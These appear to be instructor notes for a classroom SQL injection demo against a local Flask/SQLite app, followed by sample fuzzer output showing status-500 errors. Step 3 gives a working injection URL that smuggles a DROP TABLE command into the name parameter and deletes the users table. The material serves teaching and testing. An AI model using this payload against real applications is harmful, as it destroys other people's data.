How to Demonstrate in Class
1. Add a normal user
http://127.0.0.1:5000/add?name=Alice

2. Confirm table exists
http://127.0.0.1:5000/show

3. Perform the SQL Injection
http://127.0.0.1:5000/add?name=test'); DROP TABLE users; --

4. Check table again
http://127.0.0.1:5000/show

You will see something like:

Error: no such table: users

Full DROP TABLE SQL injection demonstrated using only SQLite.

If you want to run the fuzzer, make sure you run the original app.py in a separate shell, and then run the fuzzer to generate results. Sample test run:
[0] Sent name=']', got status 500
[1] Sent name='l7G[C-', got status 500
[2] Sent name='_?XRiMO]bR4i', got status 500
[3] Sent name=':4-$0+&1*p,i\nGz|8$\x0czaD<QQ', got status 500
[4] Sent name='a^y)1d|r|hkO KGiWC', got status 500
[5] Sent name='D F]rWFJ7d:^OO+M$]1r#DB3', got status 500
[6] Sent name='08q', got status 500
[7] Sent name='F&XP~\\A8=Ap{)', got status 500
[8] Sent name='f%|KU# w(`]htX:\\', got status 500
[9] Sent name='\ruS>u<B}\t"VNBwYa', got status 500
[10] Sent name='t\r.t"SA\t;\x0c)-o]D|r6W[5T}Zcu', got status 500
[11] Sent name='<YM_HSGjLrQV}}5~[', got status 500
[12] Sent name='iv1c{*D2Mu', got status 500
[13] Sent name='84`h$', got status 500
[14] Sent name="2'5?S9\n67GF:}@\t:OxO`\r", got status 500
[15] Sent name='.E0g\x0c"BQ(p#,SP;j7', got status 500
[16] Sent name='4xC]jr;3"dY6*,WtyRm:>R~\n', got status 500
[17] Sent name='X$j|bi25T{G}*6Aiqi|\t\x0bUf|py?8O\r', got status 500
[18] Sent name='\x0b3q4{9tOREZdH0&$==V4H\x0bn$', got status 500
[19] Sent name='-kWigb},)\\', got status 500
[20] Sent name='nA\nr}E', got status 500
[21] Sent name='5H]UW\\/N& e\x0c', got status 500
[22] Sent name='![', got status 500
[23] Sent name='QynAm', got status 500
[24] Sent name='zz$N<R9D~J\x0bpISXUG"\'VvS6UI7/\\a ', got status 500
[25] Sent name='?_>9`tr', got status 500
[26] Sent name='\n:t~zq=U4nwIYo', got status 500
[27] Sent name='8I.c+r"CMxs_,S$&-}5l/0', got status 500
[28] Sent name='fF.iz@2W 7\x0bgbFkIyN}O&};', got status 500
[29] Sent name='>%#=\x0cekRbmD_', got status 500
[30] Sent name=')-0&c\ns+', got status 500
[31] Sent name="_z'5hhDE6z", got status 500
[32] Sent name='};', got status 500
[33] Sent name='dApov[ACeUWjPlouX`\rZif@u\t3{K|@', got status 500
[34] Sent name='\\m]k\\Oq', got status 500
[35] Sent name='`ss&OH-mhx0\\h|2K9u@:$/($dK', got status 500
[36] Sent name='CazE JZWnJy/rJ', got status 500
[37] Sent name='$Hd$z7#rA/@]HehD`/SmUQ', got status 500
[38] Sent name='P2oL24G&#?%Mb_~\r_y"H0I', got status 500
[39] Sent name="'5$!na", got status 500
[40] Sent name='wWJ1@{oCbUw2I]\x0czrC`[y', got status 500
[41] Sent name='\tS@j54:8A;#S:Z', got status 500
[42] Sent name="b2H^'>AwLbK'U", got status 500
[43] Sent name='CZG7q9tYO;N_:EO`;V7K', got status 500
[44] Sent name="0Ej_{CP'1u*5,OZj [@", got status 500
[45] Sent name="_5__z?lG/'\x0c]3f^AHZ`\\*BNTob6Eb", got status 500
[46] Sent name="Z kEq'WI,XA`_iGbNXke72M[cMrEvt", got status 500
[47] Sent name='i\r:=$w/P=q\\M)OW&MmaRb', got status 500
[48] Sent name='`4!e0tvZ\x0bi', got status 500
[49] Sent name='u.>`!%-N*XS:gQT[.1j?.|Z^b', got status 500
[0] /show returned 34 chars
[1] /show returned 34 chars
[2] /show returned 34 chars
[3] /show returned 34 chars
[4] /show returned 34 chars
[5] /show returned 34 chars
[6] /show returned 34 chars
[7] /show returned 34 chars
[8] /show returned 34 chars
[9] /show returned 34 chars
